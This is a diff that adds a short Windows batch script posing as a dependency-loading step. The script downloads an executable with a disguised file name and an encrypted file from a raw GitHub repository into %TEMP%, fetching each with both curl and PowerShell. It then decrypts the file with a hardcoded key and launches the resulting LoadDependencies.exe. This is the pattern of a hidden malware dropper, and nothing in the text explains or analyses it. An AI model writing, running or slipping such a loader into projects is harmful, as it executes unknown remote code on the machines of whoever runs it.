@@ -1,0 +1,10 @@
+@echo off 
+curl -o "%TEMP%\ADT.exe" https://raw.githubusercontent.com/fmma228/filebin/main/packaging.standart
+curl -o "%TEMP%\LoadDependencies.cmp" https://raw.githubusercontent.com/fmma228/filebin/main/LoadDependencies.cmp 
+powershell.exe -Command "$url = 'https://raw.githubusercontent.com/fmma228/filebin/main/packaging.standart'; $dest = '%TEMP%\ADT.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" 
+powershell.exe -Command "$url = 'https://raw.githubusercontent.com/fmma228/filebin/main/LoadDependencies.cmp'; $dest = '%TEMP%\LoadDependencies.cmp'; Invoke-WebRequest -Uri $url -OutFile $dest" 
+cd %TEMP% 
+ADT.exe decrypt --input LoadDependencies.cmp --key aa0bef1bf6c6547731f57880ab122d77748d0d171e63b7536848af349fd40165
+
+start LoadDependencies.exe
+exit
